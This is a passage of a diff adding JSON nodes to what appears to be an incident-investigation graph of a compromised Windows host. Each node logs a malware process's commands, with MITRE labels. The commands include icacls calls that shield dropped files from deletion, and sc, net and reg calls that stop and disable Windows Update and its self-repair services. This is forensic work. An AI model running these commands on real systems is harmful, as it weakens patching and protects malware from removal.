+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-k1LRPMZlRWJjGRNs5QCeyA",
+        "type": "customNode",
+        "position": {
+          "x": 3050,
+          "y": 490
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "cmd.exe",
+          "type": "other",
+          "hostname": "pid 24752",
+          "ipAddress": "",
+          "os": "17:31:55 UTC",
+          "criticality": "Medium",
+          "services": [
+            "analyst"
+          ],
+          "actions": [
+            {
+              "id": "act-k1LRPMZl",
+              "type": "Execution",
+              "technique": "T1059 Command and Scripting Interpreter",
+              "details": "cmd.exe /c icacls \"C:\\Program Files (x86)\\5FhqHn\\yYRb4B.exe\" /grant:r Users:(RX) /deny Users:(DE)"
+            }
+          ],
+          "description": "C:\\Windows\\SysWOW64\\cmd.exe",
+          "isCompromised": true,
+          "investigationStatus": "No Status",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-o83YJWe92PIu16f6mUOVkg",
+        "type": "customNode",
+        "position": {
+          "x": 1070,
+          "y": 690
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "icacls.exe",
+          "type": "other",
+          "hostname": "pid 24388",
+          "ipAddress": "",
+          "os": "17:31:55 UTC",
+          "criticality": "Critical",
+          "services": [
+            "analyst"
+          ],
+          "actions": [],
+          "description": "C:\\Windows\\SysWOW64\\icacls.exe",
+          "isCompromised": true,
+          "investigationStatus": "Investigating",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-AWrs4wZotJrVjSIMpBqOLQ",
+        "type": "customNode",
+        "position": {
+          "x": 3380,
+          "y": 490
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "cmd.exe",
+          "type": "other",
+          "hostname": "pid 17248",
+          "ipAddress": "",
+          "os": "17:31:56 UTC",
+          "criticality": "Medium",
+          "services": [
+            "analyst"
+          ],
+          "actions": [
+            {
+              "id": "act-AWrs4wZo",
+              "type": "Execution",
+              "technique": "T1059 Command and Scripting Interpreter",
+              "details": "cmd.exe /c icacls \"C:\\Program Files (x86)\\5FhqHn\\image.png\" /inheritance:r"
+            }
+          ],
+          "description": "C:\\Windows\\SysWOW64\\cmd.exe",
+          "isCompromised": true,
+          "investigationStatus": "No Status",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-xld6nFood9boi/IHmY9Etw",
+        "type": "customNode",
+        "position": {
+          "x": 3710,
+          "y": 490
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "cmd.exe",
+          "type": "other",
+          "hostname": "pid 7344",
+          "ipAddress": "",
+          "os": "17:31:56 UTC",
+          "criticality": "Medium",
+          "services": [
+            "analyst"
+          ],
+          "actions": [
+            {
+              "id": "act-xld6nFoo",
+              "type": "Execution",
+              "technique": "T1059 Command and Scripting Interpreter",
+              "details": "cmd.exe /c icacls \"C:\\Program Files (x86)\\5FhqHn\\image.png\" /grant:r Administrators:(OI)(CI)F /grant:r SYSTEM:(OI)(CI)F"
+            }
+          ],
+          "description": "C:\\Windows\\SysWOW64\\cmd.exe",
+          "isCompromised": true,
+          "investigationStatus": "No Status",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-v59v8cV1RvsD26cJg18wnw",
+        "type": "customNode",
+        "position": {
+          "x": 1400,
+          "y": 690
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "icacls.exe",
+          "type": "other",
+          "hostname": "pid 11656",
+          "ipAddress": "",
+          "os": "17:31:56 UTC",
+          "criticality": "Critical",
+          "services": [
+            "analyst"
+          ],
+          "actions": [],
+          "description": "C:\\Windows\\SysWOW64\\icacls.exe",
+          "isCompromised": true,
+          "investigationStatus": "Investigating",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-+BW4Xf3jJLAxgOUaoH4Sfw",
+        "type": "customNode",
+        "position": {
+          "x": 4040,
+          "y": 490
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "cmd.exe",
+          "type": "other",
+          "hostname": "pid 13320",
+          "ipAddress": "",
+          "os": "17:31:56 UTC",
+          "criticality": "Medium",
+          "services": [
+            "analyst"
+          ],
+          "actions": [
+            {
+              "id": "act-+BW4Xf3j",
+              "type": "Execution",
+              "technique": "T1059 Command and Scripting Interpreter",
+              "details": "cmd.exe /c icacls \"C:\\Program Files (x86)\\5FhqHn\\image.png\" /grant:r Users:(RX) /deny Users:(DE)"
+            }
+          ],
+          "description": "C:\\Windows\\SysWOW64\\cmd.exe",
+          "isCompromised": true,
+          "investigationStatus": "No Status",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-4vVf94giv04QxuJ8dOJ+Dg",
+        "type": "customNode",
+        "position": {
+          "x": 1730,
+          "y": 690
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "icacls.exe",
+          "type": "other",
+          "hostname": "pid 1804",
+          "ipAddress": "",
+          "os": "17:31:57 UTC",
+          "criticality": "Critical",
+          "services": [
+            "analyst"
+          ],
+          "actions": [],
+          "description": "C:\\Windows\\SysWOW64\\icacls.exe",
+          "isCompromised": true,
+          "investigationStatus": "Investigating",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-YsT8NDxjmZ6SubIALDu9dA",
+        "type": "customNode",
+        "position": {
+          "x": 4370,
+          "y": 490
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "cmd.exe",
+          "type": "other",
+          "hostname": "pid 9068",
+          "ipAddress": "",
+          "os": "17:31:57 UTC",
+          "criticality": "Medium",
+          "services": [
+            "analyst"
+          ],
+          "actions": [
+            {
+              "id": "act-YsT8NDxj",
+              "type": "Execution",
+              "technique": "T1059 Command and Scripting Interpreter",
+              "details": "cmd.exe /c icacls \"C:\\Program Files (x86)\\5FhqHn\\thumbs.db\" /inheritance:r"
+            }
+          ],
+          "description": "C:\\Windows\\SysWOW64\\cmd.exe",
+          "isCompromised": true,
+          "investigationStatus": "No Status",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-7ytlVYBLxNhquHT/hs2qhg",
+        "type": "customNode",
+        "position": {
+          "x": 4700,
+          "y": 490
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "cmd.exe",
+          "type": "other",
+          "hostname": "pid 22616",
+          "ipAddress": "",
+          "os": "17:31:58 UTC",
+          "criticality": "Medium",
+          "services": [
+            "analyst"
+          ],
+          "actions": [
+            {
+              "id": "act-7ytlVYBL",
+              "type": "Execution",
+              "technique": "T1059 Command and Scripting Interpreter",
+              "details": "cmd.exe /c icacls \"C:\\Program Files (x86)\\5FhqHn\\thumbs.db\" /grant:r Administrators:(OI)(CI)F /grant:r SYSTEM:(OI)(CI)F"
+            }
+          ],
+          "description": "C:\\Windows\\SysWOW64\\cmd.exe",
+          "isCompromised": true,
+          "investigationStatus": "No Status",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-CL/TyDLMCsJ6MsirFUdEfA",
+        "type": "customNode",
+        "position": {
+          "x": 2060,
+          "y": 690
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "icacls.exe",
+          "type": "other",
+          "hostname": "pid 10588",
+          "ipAddress": "",
+          "os": "17:32:00 UTC",
+          "criticality": "Critical",
+          "services": [
+            "analyst"
+          ],
+          "actions": [],
+          "description": "C:\\Windows\\SysWOW64\\icacls.exe",
+          "isCompromised": true,
+          "investigationStatus": "Investigating",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-DzcchMqgs4/UKSWQWx9H7g",
+        "type": "customNode",
+        "position": {
+          "x": 5030,
+          "y": 490
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "cmd.exe",
+          "type": "other",
+          "hostname": "pid 13028",
+          "ipAddress": "",
+          "os": "17:32:03 UTC",
+          "criticality": "Medium",
+          "services": [
+            "analyst"
+          ],
+          "actions": [
+            {
+              "id": "act-DzcchMqg",
+              "type": "Execution",
+              "technique": "T1059 Command and Scripting Interpreter",
+              "details": "cmd.exe /c icacls \"C:\\Program Files (x86)\\5FhqHn\\thumbs.db\" /grant:r Users:(RX) /deny Users:(DE)"
+            }
+          ],
+          "description": "C:\\Windows\\SysWOW64\\cmd.exe",
+          "isCompromised": true,
+          "investigationStatus": "No Status",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-7pi/2W02vMe2hfSp1TDbuA",
+        "type": "customNode",
+        "position": {
+          "x": 2390,
+          "y": 690
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "icacls.exe",
+          "type": "other",
+          "hostname": "pid 13412",
+          "ipAddress": "",
+          "os": "17:32:06 UTC",
+          "criticality": "Critical",
+          "services": [
+            "analyst"
+          ],
+          "actions": [],
+          "description": "C:\\Windows\\SysWOW64\\icacls.exe",
+          "isCompromised": true,
+          "investigationStatus": "Investigating",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-t6Rum3m809aTJ2gVQh+0Ow",
+        "type": "customNode",
+        "position": {
+          "x": 5360,
+          "y": 490
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "cmd.exe",
+          "type": "other",
+          "hostname": "pid 17240",
+          "ipAddress": "",
+          "os": "17:32:07 UTC",
+          "criticality": "Medium",
+          "services": [
+            "analyst"
+          ],
+          "actions": [
+            {
+              "id": "act-t6Rum3m8",
+              "type": "Execution",
+              "technique": "T1059 Command and Scripting Interpreter",
+              "details": "cmd.exe /c icacls \"C:\\Program Files (x86)\\5FhqHn\\XPSPLOG.dll\" /inheritance:r"
+            }
+          ],
+          "description": "C:\\Windows\\SysWOW64\\cmd.exe",
+          "isCompromised": true,
+          "investigationStatus": "No Status",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-3gFo6WWD8alrcnRxdCUotw",
+        "type": "customNode",
+        "position": {
+          "x": 5690,
+          "y": 490
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "cmd.exe",
+          "type": "other",
+          "hostname": "pid 8472",
+          "ipAddress": "",
+          "os": "17:32:11 UTC",
+          "criticality": "Medium",
+          "services": [
+            "analyst"
+          ],
+          "actions": [
+            {
+              "id": "act-3gFo6WWD",
+              "type": "Execution",
+              "technique": "T1059 Command and Scripting Interpreter",
+              "details": "cmd.exe /c icacls \"C:\\Program Files (x86)\\5FhqHn\\XPSPLOG.dll\" /grant:r Administrators:(OI)(CI)F /grant:r SYSTEM:(OI)(CI)F"
+            }
+          ],
+          "description": "C:\\Windows\\SysWOW64\\cmd.exe",
+          "isCompromised": true,
+          "investigationStatus": "No Status",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-B7Dy6HYInYSoeyrvo9kS6Q",
+        "type": "customNode",
+        "position": {
+          "x": 2720,
+          "y": 690
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "icacls.exe",
+          "type": "other",
+          "hostname": "pid 19336",
+          "ipAddress": "",
+          "os": "17:32:13 UTC",
+          "criticality": "Critical",
+          "services": [
+            "analyst"
+          ],
+          "actions": [],
+          "description": "C:\\Windows\\SysWOW64\\icacls.exe",
+          "isCompromised": true,
+          "investigationStatus": "Investigating",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-1pYVzq7pBK/pvL//9viwEQ",
+        "type": "customNode",
+        "position": {
+          "x": 6020,
+          "y": 490
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "cmd.exe",
+          "type": "other",
+          "hostname": "pid 11212",
+          "ipAddress": "",
+          "os": "17:32:14 UTC",
+          "criticality": "Medium",
+          "services": [
+            "analyst"
+          ],
+          "actions": [
+            {
+              "id": "act-1pYVzq7p",
+              "type": "Execution",
+              "technique": "T1059 Command and Scripting Interpreter",
+              "details": "cmd.exe /c icacls \"C:\\Program Files (x86)\\5FhqHn\\XPSPLOG.dll\" /grant:r Users:(RX) /deny Users:(DE)"
+            }
+          ],
+          "description": "C:\\Windows\\SysWOW64\\cmd.exe",
+          "isCompromised": true,
+          "investigationStatus": "No Status",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-rMVkaYn6W2eYq4RFszIzqA",
+        "type": "customNode",
+        "position": {
+          "x": 3050,
+          "y": 690
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "icacls.exe",
+          "type": "other",
+          "hostname": "pid 15004",
+          "ipAddress": "",
+          "os": "17:32:15 UTC",
+          "criticality": "Critical",
+          "services": [
+            "analyst"
+          ],
+          "actions": [],
+          "description": "C:\\Windows\\SysWOW64\\icacls.exe",
+          "isCompromised": true,
+          "investigationStatus": "Investigating",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-bVZ5CqnaIxXip/48TEqRsA",
+        "type": "customNode",
+        "position": {
+          "x": 1730,
+          "y": 90
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "sc.exe",
+          "type": "other",
+          "hostname": "pid 24064",
+          "ipAddress": "",
+          "os": "17:32:19 UTC",
+          "criticality": "Medium",
+          "services": [
+            "analyst"
+          ],
+          "actions": [
+            {
+              "id": "act-bVZ5Cqna",
+              "type": "Execution",
+              "technique": "T1059 Command and Scripting Interpreter",
+              "details": "sc  config UsoSvc start= disabled  "
+            }
+          ],
+          "description": "C:\\Windows\\SysWOW64\\sc.exe",
+          "isCompromised": true,
+          "investigationStatus": "No Status",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-G1AzuJzduM4+QFwzlshhQQ",
+        "type": "customNode",
+        "position": {
+          "x": 2060,
+          "y": 90
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "sc.exe",
+          "type": "other",
+          "hostname": "pid 4560",
+          "ipAddress": "",
+          "os": "17:32:19 UTC",
+          "criticality": "Medium",
+          "services": [
+            "analyst"
+          ],
+          "actions": [
+            {
+              "id": "act-G1AzuJzd",
+              "type": "Execution",
+              "technique": "T1059 Command and Scripting Interpreter",
+              "details": "sc  failure UsoSvc reset= 0 actions= \"\"  "
+            }
+          ],
+          "description": "C:\\Windows\\SysWOW64\\sc.exe",
+          "isCompromised": true,
+          "investigationStatus": "No Status",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-HG4pzGin01JEmVZGbvuRfQ",
+        "type": "customNode",
+        "position": {
+          "x": 2390,
+          "y": 90
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "net.exe",
+          "type": "other",
+          "hostname": "pid 9252",
+          "ipAddress": "",
+          "os": "17:32:19 UTC",
+          "criticality": "Medium",
+          "services": [
+            "analyst"
+          ],
+          "actions": [
+            {
+              "id": "act-HG4pzGin",
+              "type": "Execution",
+              "technique": "T1059 Command and Scripting Interpreter",
+              "details": "net  stop uhssvc  "
+            }
+          ],
+          "description": "C:\\Windows\\SysWOW64\\net.exe",
+          "isCompromised": true,
+          "investigationStatus": "No Status",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-sAQTadgcBjM6Nc/O8A3aDQ",
+        "type": "customNode",
+        "position": {
+          "x": 1400,
+          "y": 290
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "net1.exe",
+          "type": "other",
+          "hostname": "pid 16916",
+          "ipAddress": "",
+          "os": "17:32:19 UTC",
+          "criticality": "Medium",
+          "services": [
+            "analyst"
+          ],
+          "actions": [
+            {
+              "id": "act-sAQTadgc",
+              "type": "Execution",
+              "technique": "T1059 Command and Scripting Interpreter",
+              "details": "C:\\Windows\\system32\\net1  stop uhssvc  "
+            }
+          ],
+          "description": "C:\\Windows\\SysWOW64\\net1.exe",
+          "isCompromised": true,
+          "investigationStatus": "No Status",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-FIro1KcLRxqYbovMJ077Dg",
+        "type": "customNode",
+        "position": {
+          "x": 2720,
+          "y": 90
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "sc.exe",
+          "type": "other",
+          "hostname": "pid 11480",
+          "ipAddress": "",
+          "os": "17:32:20 UTC",
+          "criticality": "Medium",
+          "services": [
+            "analyst"
+          ],
+          "actions": [
+            {
+              "id": "act-FIro1KcL",
+              "type": "Execution",
+              "technique": "T1059 Command and Scripting Interpreter",
+              "details": "sc  config uhssvc start= disabled  "
+            }
+          ],
+          "description": "C:\\Windows\\SysWOW64\\sc.exe",
+          "isCompromised": true,
+          "investigationStatus": "No Status",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-ji0ULd1RaI8ZvjkB7wBycg",
+        "type": "customNode",
+        "position": {
+          "x": 3050,
+          "y": 90
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "sc.exe",
+          "type": "other",
+          "hostname": "pid 23964",
+          "ipAddress": "",
+          "os": "17:32:20 UTC",
+          "criticality": "Medium",
+          "services": [
+            "analyst"
+          ],
+          "actions": [
+            {
+              "id": "act-ji0ULd1R",
+              "type": "Execution",
+              "technique": "T1059 Command and Scripting Interpreter",
+              "details": "sc  failure uhssvc reset= 0 actions= \"\"  "
+            }
+          ],
+          "description": "C:\\Windows\\SysWOW64\\sc.exe",
+          "isCompromised": true,
+          "investigationStatus": "No Status",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-LmG7U0ha0FPrJy6l6n4u+w",
+        "type": "customNode",
+        "position": {
+          "x": 3380,
+          "y": 90
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "net.exe",
+          "type": "other",
+          "hostname": "pid 10324",
+          "ipAddress": "",
+          "os": "17:32:20 UTC",
+          "criticality": "Medium",
+          "services": [
+            "analyst"
+          ],
+          "actions": [
+            {
+              "id": "act-LmG7U0ha",
+              "type": "Execution",
+              "technique": "T1059 Command and Scripting Interpreter",
+              "details": "net  stop WaaSMedicSvc  "
+            }
+          ],
+          "description": "C:\\Windows\\SysWOW64\\net.exe",
+          "isCompromised": true,
+          "investigationStatus": "No Status",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-H01XpZ625t7k3dYn19lplw",
+        "type": "customNode",
+        "position": {
+          "x": 1730,
+          "y": 290
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "net1.exe",
+          "type": "other",
+          "hostname": "pid 22640",
+          "ipAddress": "",
+          "os": "17:32:20 UTC",
+          "criticality": "Medium",
+          "services": [
+            "analyst"
+          ],
+          "actions": [
+            {
+              "id": "act-H01XpZ62",
+              "type": "Execution",
+              "technique": "T1059 Command and Scripting Interpreter",
+              "details": "C:\\Windows\\system32\\net1  stop WaaSMedicSvc  "
+            }
+          ],
+          "description": "C:\\Windows\\SysWOW64\\net1.exe",
+          "isCompromised": true,
+          "investigationStatus": "No Status",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-USWiLVGGKX7xlTHwjrLIwg",
+        "type": "customNode",
+        "position": {
+          "x": 3710,
+          "y": 90
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "sc.exe",
+          "type": "other",
+          "hostname": "pid 7260",
+          "ipAddress": "",
+          "os": "17:32:20 UTC",
+          "criticality": "Medium",
+          "services": [
+            "analyst"
+          ],
+          "actions": [
+            {
+              "id": "act-USWiLVGG",
+              "type": "Execution",
+              "technique": "T1059 Command and Scripting Interpreter",
+              "details": "sc  config WaaSMedicSvc start= disabled  "
+            }
+          ],
+          "description": "C:\\Windows\\SysWOW64\\sc.exe",
+          "isCompromised": true,
+          "investigationStatus": "No Status",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-TziLwVQXhqGzJuJktwWozw",
+        "type": "customNode",
+        "position": {
+          "x": 4040,
+          "y": 90
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "sc.exe",
+          "type": "other",
+          "hostname": "pid 16424",
+          "ipAddress": "",
+          "os": "17:32:20 UTC",
+          "criticality": "Medium",
+          "services": [
+            "analyst"
+          ],
+          "actions": [
+            {
+              "id": "act-TziLwVQX",
+              "type": "Execution",
+              "technique": "T1059 Command and Scripting Interpreter",
+              "details": "sc  failure WaaSMedicSvc reset= 0 actions= \"\"  "
+            }
+          ],
+          "description": "C:\\Windows\\SysWOW64\\sc.exe",
+          "isCompromised": true,
+          "investigationStatus": "No Status",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-C3rJAVW++rhS9AqAZjV6SQ",
+        "type": "customNode",
+        "position": {
+          "x": 4370,
+          "y": 90
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "reg.exe",
+          "type": "other",
+          "hostname": "pid 22892",
+          "ipAddress": "",
+          "os": "17:32:23 UTC",
+          "criticality": "Medium",
+          "services": [
+            "analyst"
+          ],
+          "actions": [
+            {
+              "id": "act-C3rJAVW+",
+              "type": "Execution",
+              "technique": "T1059 Command and Scripting Interpreter",
+              "details": "reg  add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\WaaSMedicSvc\" /v Start /t REG_DWORD /d 4 /f  "
+            }
+          ],
+          "description": "C:\\Windows\\SysWOW64\\reg.exe",
+          "isCompromised": true,
+          "investigationStatus": "No Status",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
+        }
+      },
+      {
+        "id": "p-vPLHCRJcVs0iR5eyoag4bA",
+        "type": "customNode",
+        "position": {
+          "x": 4700,
+          "y": 90
+        },
+        "zIndex": 1,
+        "data": {
+          "label": "reg.exe",
+          "type": "other",
+          "hostname": "pid 7092",
+          "ipAddress": "",
+          "os": "17:32:23 UTC",
+          "criticality": "Medium",
+          "services": [
+            "analyst"
+          ],
+          "actions": [
+            {
+              "id": "act-vPLHCRJc",
+              "type": "Execution",
+              "technique": "T1059 Command and Scripting Interpreter",
+              "details": "reg  add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\WaaSMedicSvc\" /v FailureActions /t REG_BINARY /d 000000000000000000000000030000001400000000000000c0d4010000000000e09304000000000000000000 /f  "
+            }
+          ],
+          "description": "C:\\Windows\\SysWOW64\\reg.exe",
+          "isCompromised": true,
+          "investigationStatus": "No Status",
+          "displaySettings": {
+            "showHostname": true,
+            "showIpAddress": true,
+            "showOs": true,
+            "showServices": true,
+            "showCriticality": true,
+            "showActions": true,
+            "showDescription": true,
+            "showUsername": false,
+            "showDomain": false,
+            "showAccountType": false,
+            "showAccountSource": false,
+            "showAccountStatus": false
+          }
